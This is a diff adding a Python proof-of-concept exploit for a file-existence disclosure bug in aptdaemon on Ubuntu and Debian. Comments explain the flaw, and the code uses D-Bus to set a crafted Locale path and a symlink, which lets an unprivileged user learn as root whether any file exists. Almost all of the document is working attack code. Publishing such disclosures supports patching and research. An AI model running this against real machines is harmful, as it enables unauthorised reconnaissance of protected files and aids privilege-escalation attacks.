@@ -1,0 +1,73 @@
+# Exploit Title: File Existence Disclosure in aptdaemon <= 1.1.1+bzr982-0ubuntu32.1
+# Date: 2020-10-27
+# Exploit Author: Vaisha Bernard (vbernard - at - eyecontrol.nl)
+# Vendor Homepage: https://wiki.debian.org/aptdaemon
+# Software Link: https://wiki.debian.org/aptdaemon
+# Version: <= 1.1.1+bzr982-0ubuntu32.1
+# Tested on: Ubuntu 20.04
+#
+#!/usr/bin/env python3
+#
+# Ubuntu 16.04 - 20.04 
+# Debian 9 - 11
+# aptdaemon < 1.1.1+bzr982-0ubuntu32.1
+# Sensitive Information Disclosure
+# 
+# Reference: https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html
+#
+# There is no input validation on the Locale property in an 
+# apt transaction. An unprivileged user can supply a full path
+# to a writable directory, which lets aptd read a file as root. 
+# Having a symlink in place results in an error message if the 
+# file exists, and no error otherwise. This way an unprivileged 
+# user can check for the existence of any files on the system 
+# as root.
+#
+# This is a similar type of bug as CVE-2015-1323.
+#
+# 
+# $ ./test_file_exists.py /root/.bashrc
+# File Exists!
+# $ ./test_file_exists.py /root/.bashrca
+# File does not exist!
+#
+#
+
+import dbus
+import os
+import sys
+
+if len(sys.argv) != 2:
+	print("Checks if file exists")
+	print("Usage: %s <file>")
+	sys.exit(0)
+
+FILE_TO_CHECK = sys.argv[1]
+
+bus = dbus.SystemBus()
+apt_dbus_object = bus.get_object("org.debian.apt", "/org/debian/apt")
+apt_dbus_interface = dbus.Interface(apt_dbus_object, "org.debian.apt")  
+
+# just use any valid .deb file
+trans = apt_dbus_interface.InstallFile("/var/cache/apt/archives/dbus_1.12.14-1ubuntu2.1_amd64.deb", False)
+
+apt_trans_dbus_object = bus.get_object("org.debian.apt", trans)
+apt_trans_dbus_interface = dbus.Interface(apt_trans_dbus_object, "org.debian.apt.transaction")
+
+properties_manager = dbus.Interface(apt_trans_dbus_interface, 'org.freedesktop.DBus.Properties')
+
+os.mkdir("/tmp/a")
+os.mkdir("/tmp/a/LC_MESSAGES")
+os.symlink(FILE_TO_CHECK, "/tmp/a/LC_MESSAGES/aptdaemon.mo")
+
+try:
+	properties_manager.Set("org.debian.apt.transaction", "Locale", "/tmp/a.")
+except:
+	print("File Exists!")
+	pass
+else:
+	print("File does not exist!")
+
+os.unlink("/tmp/a/LC_MESSAGES/aptdaemon.mo")
+os.rmdir("/tmp/a/LC_MESSAGES")
+os.rmdir("/tmp/a")
